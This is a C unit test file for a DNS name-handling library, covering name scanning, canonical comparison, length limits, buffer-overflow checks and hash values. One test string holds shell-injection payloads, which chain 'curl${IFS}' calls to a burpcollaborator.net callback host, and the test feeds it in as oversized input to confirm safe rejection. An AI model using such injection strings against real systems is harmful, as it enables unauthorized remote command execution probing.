#include <kit-alloc.h>
#include <tap.h>

#include "common-test.h"
#include "dns-name.h"
#include "rr-type.h"

static int
canoncmp(const char *name0, const char *name1)
{
    uint8_t smash1, n0[DNS_MAXLEN_NAME], smash2, n1[DNS_MAXLEN_NAME], smash3;

    smash1 = smash2 = smash3 = 0xa5;
    ok(dns_name_sscan(name0, "", n0), "Created '%s' name", name0);
    ok(dns_name_sscan(name1, "", n1), "Created '%s' name", name1);
    ok(smash1 == 0xa5 && smash2 == 0xa5 && smash3 == 0xa5, "No buffer overflows detected");

    return dns_name_canoncmp(n0, n1);
}

int
main(void)
{
    uint64_t start_allocations;
    unsigned i, name_len;
    uint8_t  name1[DNS_MAXLEN_NAME], name2[DNS_MAXLEN_NAME], pkey[DNS_MAXLEN_NAME], nametoobig[300];
    char     str[DNS_MAXLEN_STRING + 1], stringtoobig[300];

    plan_tests(119);
    kit_memory_initialize(false);
    // KIT_ALLOC_SET_LOG(1);    // Turn off when done
    ok(start_allocations = memory_allocations(), "Clocked the initial # memory allocations");

    name_len = sizeof(name1);
    ok(dns_name_sscan_len("x", "", name1, &name_len), "Scanned 'x', returning length");
    is(name_len, dns_name_len(name1), "Scanned name length %u equals computed name length %u", name_len, dns_name_len(name1));
    is_eq(dns_name_to_str1(name1), "x", "Correctly scanned 'x'");
    name_len = sizeof(name1);
    ok(dns_name_sscan_len(".", "", name1, &name_len), "Scanned '.', returning length");
    is(name_len, dns_name_len(name1), "Scanned name length %u equals computed name length %u", name_len, dns_name_len(name1));
    is_eq(dns_name_to_str1(name1), ".", "Correctly scanned '.'");

    ok(dns_name_sscan("www.some.domain", "", name1), "Created 'www.some.domain' name");
    ok(dns_name_sscan("some.domain", "", name2), "Created 'some.domain' name");
    ok(dns_name_suffix(name1, name2), "%s has a suffix of %s", dns_name_to_str1(name1), dns_name_to_str2(name2));
    ok(!dns_name_suffix(name2, name1), "%s does not have a suffix of %s", dns_name_to_str2(name2), dns_name_to_str1(name1));

    dns_name_prefixtreekey(pkey, name1, dns_name_len(name1));
    is_eq(prefixtreekey_txt(pkey, dns_name_len(name1)), dns_name_to_str1(name1), "prefixtreekey_txt produces the correct name");

    ok(dns_name_sscan("2.0.0.127.zen.spamhaus.org", "", name1), "Created '2.0.0.127.zen.spamhaus.org' name");
    dns_name_prefixtreekey(pkey, name1, dns_name_len(name1));
    is_eq(prefixtreekey_txt(pkey, dns_name_len(name1)), dns_name_to_str1(name1), "prefixtreekey_txt produces the correct name");

    dns_name_sscan(".", "", name1);
    ok(dns_name_equal(name1, DNS_NAME_ROOT), "scanning '.' gives an empty name");
    ok(!dns_name_sscan(".something", "", name1), "scanning '.something' fails");
    ok(!dns_name_sscan("some..domain", "", name1), "scanning 'some..domain' fails");

    nametoobig[0] = 63;
    memset(nametoobig + 1, 'x', 63);
    nametoobig[64] = 63;
    memset(nametoobig + 65, 'y', 63);
    nametoobig[128] = 63;
    memset(nametoobig + 129, 'z', 63);
    nametoobig[192] = 61;
    memset(nametoobig + 193, 'a', 61);
    nametoobig[254] = 0;
    ok(dns_name_to_buf(nametoobig, str, sizeof(str), NULL, DNS_NAME_DEFAULT), "dns_name_to_buf a name that's exactly max length");
    is(dns_name_prefix_unsigned(nametoobig, 1, name1), NULL, "Can't prepend a label to a max length string");

    ok(dns_name_sscan("www.some.domain", "", name1), "Created 'www.some.domain' name");
    is(dns_name_prefix_unsigned(name1, 0, name2), name1, "Prepending zero to a name just returns the name");

    nametoobig[0] = 63;
    memset(nametoobig + 1, 'x', 63);
    nametoobig[64] = 63;
    memset(nametoobig + 65, 'y', 63);
    nametoobig[128] = 63;
    memset(nametoobig + 129, 'z', 63);
    nametoobig[192] = 62;
    memset(nametoobig + 193, 'a', 62);
    nametoobig[255] = 0;
    ok(!dns_name_to_buf(nametoobig, str, sizeof(str), NULL, DNS_NAME_DEFAULT), "Cannot dns_name_to_buf a name that's too long");
    is_eq(dns_name_to_str1(nametoobig), "?", "The too-long name is printed as a ?");

    nametoobig[0] = 99;
    memset(nametoobig + 1, 'x', 99);
    nametoobig[100] = 99;
    memset(nametoobig + 101, 'y', 99);
    nametoobig[200] = 98;
    memset(nametoobig + 201, 'z', 98);
    nametoobig[299] = 0;
    ok(!dns_name_to_buf(nametoobig, str, sizeof(str), NULL, DNS_NAME_DEFAULT), "Cannot dns_name_to_buf a name that's too long");

    memset(stringtoobig, 'x', 64);
    stringtoobig[64] = '\0';
    ok(!dns_name_sscan(stringtoobig, "", name1), "Cannot dns_name_sscan a string with a component that's too long");

    memset(stringtoobig, 'a', 59);
    stringtoobig[59] = '.';
    memset(stringtoobig + 60, 'b', 59);
    stringtoobig[119] = '.';
    memset(stringtoobig + 120, 'c', 59);
    stringtoobig[179] = '.';
    memset(stringtoobig + 180, 'd', 59);
    stringtoobig[239] = '.';
    memset(stringtoobig + 240, 'e', 59);
    stringtoobig[299] = '\0';
    ok(!dns_name_sscan(stringtoobig, "", name1), "Cannot dns_name_sscan a string that's too long");

    stringtoobig[254] = '\0';
    ok(!dns_name_sscan(stringtoobig, "", name1), "Cannot dns_name_sscan a string that's 254 bytes long");
    stringtoobig[253] = '\0';
    ok(dns_name_sscan(stringtoobig, "", name1), "dns_name_sscan is ok on a string that's 253 bytes long");

    is(rr_type_from_str("rp"),      RR_TYPE_RP,      "rr_type_from_str(\"rp\") is correct (lower-case)");
    is(rr_type_from_str("AAAA"),    RR_TYPE_AAAA,    "rr_type_from_str(\"AAAA\") is correct (capitals)");
    is(rr_type_from_str("garbage"), RR_TYPE_INVALID, "rr_type_from_str(\"garbage\") is INVALID");
    is(rr_type_from_str("TYPE123"), CONST_HTONS(123), "rr_type_from_str(\"TYPE123\") is 123");
    is(rr_type_from_str("TYPEABC"), RR_TYPE_INVALID, "rr_type_from_str(\"TYPEABC\") is INVALID");

    char buf[4];
    is_eq(rr_type_to_buf(RR_TYPE_A, buf, 3),    "A",  "RR_TYPE_A is recognised by rrtype_to_buf() and is truncated correctly");
    is_eq(rr_type_to_buf(RR_TYPE_TXT, buf, 3),  "TX", "RR_TYPE_TXT is recognised by rrtype_to_buf() and is truncated correctly");
    is_eq(rr_type_to_buf(htons(12345), buf, 3), "TY", "Type 12345 is not recognised by rrtype_to_buf() and is truncated correctly");

    diag("Test dns_name_equal()");
    {
        ok(dns_name_equal((const uint8_t *)"\003foo\003COM", (const uint8_t *)"\003foo\003com"), "foo.COM and foo.com are equal");
        ok(!dns_name_equal((const uint8_t *)"\001a\003foo\003COM", (const uint8_t *)"\001b\003foo\003com") > 0, "a.foo.COM is less than b.foo.com");
        ok(!dns_name_equal((const uint8_t *)"\001a\003foo\003COM", (const uint8_t *)"\003foo\003com"), "a.foo.COM is not equal to foo.com");
    }

    diag("Test dns_name_ancestor_subdomain()");
    {
        const uint8_t *name = (const uint8_t *)"\005stuff\003foo\003bar\003com";
        const uint8_t *domain = dns_name_label(name, 3);
        ok(dns_name_equal(domain, (const uint8_t *)"\003com"), "domain %s is as expected", dns_name_to_str1(domain));

        domain = dns_name_ancestor_subdomain(name, domain);
        ok(dns_name_equal(domain, (const uint8_t *)"\003bar\003com"), "domain with added label is as expected");

        domain = dns_name_ancestor_subdomain(name, domain);
        ok(dns_name_equal(domain, (const uint8_t *)"\003foo\003bar\003com"), "domain with added label is as expected");

        domain = dns_name_ancestor_subdomain(name, domain);
        ok(dns_name_equal(domain, (const uint8_t *)"\005stuff\003foo\003bar\003com"), "domain with added label is as expected");
        ok(dns_name_equal(name, domain), "domain now matches name");

        ok(dns_name_ancestor_subdomain(name, domain) == NULL, "dns_name_ancestor_subdomain() with domain of full name is NULL");

        domain = dns_name_ancestor_subdomain(name, (const uint8_t *) "");
        ok(dns_name_equal(domain, (const uint8_t *)"\003com"), "Using static root-domain has correct subdomain");
    }

    diag("Test dns_name_canoncmp()");
    {
        char max[DNS_MAXLEN_STRING + 1];

        ok(canoncmp("www.foo.com", "www.foo.com") == 0, "www.foo.com compares against itself as 0");
        ok(canoncmp("www.foo.com", "www.FOO.com") == 0, "www.foo.com compares against itself as 0, independent of case");
        ok(canoncmp("www.FOO.com", "www.foo.com") == 0, "www.foo.com compares against itself as 0, independent of case");

        ok(canoncmp("www.foo.com", "foo.com") > 0, "www.foo.com > foo.com");
        ok(canoncmp("www.foo.com", "www.foo.ORG") < 0, "www.foo.com < www.foo.ORG");
        ok(canoncmp("www.foo.com", "foo.ORG") < 0, "www.foo.com < foo.ORG");
        ok(canoncmp("foo.com", "www.foo.ORG") < 0, "foo.com < www.foo.ORG");

        for (i = 0; i < sizeof(max) - 2; i += 2)
            strcpy(max + i, "a.");
        max[i] = '\0';

        ok(canoncmp("www.foo.COM", max) > 0, "www.foo.ORG > a.a....a.a (max labels)");
    }

    diag("Names can overflow immediately");
    {
        const char *big = "resolver1.opendns.com;curl${IFS}resolver1.opendns.comrce545636965588tvlu2d3avrqrz0bqv718gzmqaf.burpcollaborator.net;"
                          "#${IFS}';curl${IFS}resolver1.opendns.comrce724148905588tvlu2d3avrqrz0bqv718gzmqaf.burpcollaborator.net;#${IFS}\";"
                          "curl${IFS}resolver1.opendns.comrce764875435588tvlu2d3avrqrz0bqv718gzmqaf.burpcollaborator.net;#${IFS}\r\n\r\n";
        const char *delim = "\r";

        nametoobig[DNS_MAXLEN_NAME] = 'x';
        ok(!dns_name_sscan(big, delim, nametoobig), "Cannot sscan an oversized name (%zu bytes), stopping at '\\r'", strlen(big));
        ok(nametoobig[DNS_MAXLEN_NAME] == 'x', "No buffer overflow seen");

        name_len = sizeof(name1);
        ok(!dns_name_sscan_len("", "", name1, &name_len), "Cannot sscan an empty string");
        name_len = sizeof(name1);
        ok(dns_name_sscan_len("x", "", name1, &name_len), "Scanned 'x'");
        is_eq(dns_name_to_str1(name1), "x", "Name scanned as 'x.'");
        name_len = 1;
        ok(!dns_name_sscan_len("x", "", name1, &name_len), "Cannot scan 'x' into a target with size 1 byte");
        name_len = 2;
        ok(!dns_name_sscan_len("x", "", name1, &name_len), "Cannot scan 'x' into a target with size 2 bytes");
        name_len = 3;
        ok(dns_name_sscan_len("x", "", name1, &name_len), "Scanned 'x' into a target with size 3 bytes");
        is_eq(dns_name_to_str1(name1), "x", "Name scanned as 'x.'");
    }

    diag("Murmurhash32 names");
    {
        is(dns_name_hash32((const uint8_t *)"\1x\2xy\3com"), 3608870029, "name x.xy.com has correct murmurhash");
        is(dns_name_hash32((const uint8_t *)"\1y\2xy\3com"), 963774135, "name y.xy.com has correct murmurhash");
        is(dns_name_hash32((const uint8_t *)"\1x\2xy\3cow"), 356947608, "name x.xy.cow has correct murmurhash");
        is(dns_name_hash32((const uint8_t *)"\1a\2bc\3org\2uk"), 2359564224, "name a.bc.org.uk has correct murmurhash");
        is(dns_name_fingerprint_bit((const uint8_t *)"\1a\2bc\3com"), 4194304, "name a.bc.com has correct random murmurhash 32 bit set");
        is(dns_name_fingerprint_bit((const uint8_t *)"\1b\2bc\3com"), 536870912, "name b.bc.com has correct random murmurhash 32 bit set");
        is(dns_name_fingerprint_bit((const uint8_t *)"\1a\2bc\3cow"), 1073741824, "name a.bc.cow has correct random murmurhash 32 bit set");
        is(dns_name_fingerprint_bit((const uint8_t *)"\1a\2bc\3org\2uk"), 1, "name a.bc.org.uk has correct random murmurhash 32 bit set");
    }

    diag("Murmurhash32 labels");
    {
        is(dns_label_hash32((const uint8_t *)"\1x"), 1744915072, "label x has correct murmurhash");
        is(dns_label_hash32((const uint8_t *)"\1x\3xyz"), 1744915072, "only the first label x is hashed (ignoring xyz label)");
        is(dns_label_hash32((const uint8_t *)"\2xy"), 1868334010, "label xy has correct murmurhash");
        is(dns_label_hash32((const uint8_t *)"\2xz"), 368525573, "label xz has correct murmurhash");
        is(dns_label_hash32((const uint8_t *)"\2wy"), 3259001578, "label wy has correct murmurhash");
        is(dns_label_fingerprint_bit7((const uint8_t *)"\1x"), 32, "label x has correct random murmurhash 7 bit set");
        is(dns_label_fingerprint_bit7((const uint8_t *)"\2xy"), 16, "label xy has correct random murmurhash 7 bit set");
        is(dns_label_fingerprint_bit7((const uint8_t *)"\2xz"), 8, "label xz has correct random murmurhash 7 bit set");
        is(dns_label_fingerprint_bit7((const uint8_t *)"\2wy"), 1, "label wy has correct random murmurhash 7 bit set");
    }

    diag("Coverage tests");
    {
        uint8_t *name_ptr;

        dns_name_sscan("OpenDNS.com", "", name1);
        ok(name_ptr = dns_name_dup(name1),                              "Duplicated OpenDNS.com");
        is(memcmp(name_ptr, name1, sizeof("OpenDNS.com") + 1), 0,       "Duplicate is exactly the same");
        kit_free(name_ptr);
        is(dns_name_to_lower(name2, name1), sizeof("OpenDNS.com") + 1,  "dns_name_to_lower returns the length of the name");
        ok(dns_name_has_prefix(name1, name2),                           "opendns.com is a prefix of OpenDNS.com");
        is(dns_name_prefix_unsigned(name1, 1, name2), name2,            "Prefixed name created and returned in name2");
        is_eq(dns_name_to_str1(name2), "1.OpenDNS.com",                 "1. prefix correctly applied");

        ok(dns_name_sscan("\\065\\B", "", name1),                       "Single escape character + bogus escape scanned");
        is_eq(dns_name_to_str1(name1), "AB",                            "Escaped name '\\065\\B' correctly converted to 'AB'");

        dns_name_sscan("www.OpenDNS.com", "", name1);
        dns_name_sscan("org", "", name2);
        ok(!dns_name_subdomain(name1, name2, 1),                        "www.OpenDNS.com is not a subdomain of org");
        is(dns_name_endswith(name1, name2), -1,                         "www.OpenDNS.com does not end with org");
        dns_name_sscan("com", "", name2);
        is(dns_name_subdomain(name1, name2, 1), name1 + 4,              "www.OpenDNS.com is a subdomain of com");
        is(dns_name_endswith(name1, name2),     sizeof("www.OpenDNS"),  "www.OpenDNS.com end with com at expected offset");
        is(dns_label_count(name1, name2),       3,                      "www.OpenDNS.com has 3 labels");
        is(*name2,                              7,                      "Longest label is 7 characters long");
    }

    is(memory_allocations(), start_allocations, "All memory allocations were freed after dns tests");
    return exit_status();
}
